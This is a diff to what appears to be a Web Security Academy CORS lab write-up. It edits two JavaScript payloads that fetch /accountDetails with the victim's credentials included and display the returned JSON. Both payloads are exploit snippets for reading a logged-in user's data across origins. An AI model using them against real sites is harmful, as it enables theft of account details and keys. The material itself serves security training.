@@ -16,10 +16,7 @@ last_update:
 
 ```html
 <script>
-  fetch(
-    "https://0ae00026030c463780b68f5900490011.web-security-academy.net/accountDetails",
-    { credentials: "include" },
-  )
+  fetch(`${location.origin}/accountDetails`, { credentials: "include" })
     .then((res) => res.json())
     .then((json) => {
       alert(JSON.stringify(json));
@@ -126,10 +123,7 @@ http://stock.0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/?productI
 
 ```html
 <script>
-  fetch(
-    "https://0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/accountDetails",
-    { credentials: "include" },
-  )
+  fetch(`${location.origin}/accountDetails`, { credentials: "include" })
     .then((res) => res.json())
     .then((json) => {
       alert(JSON.stringify(json));
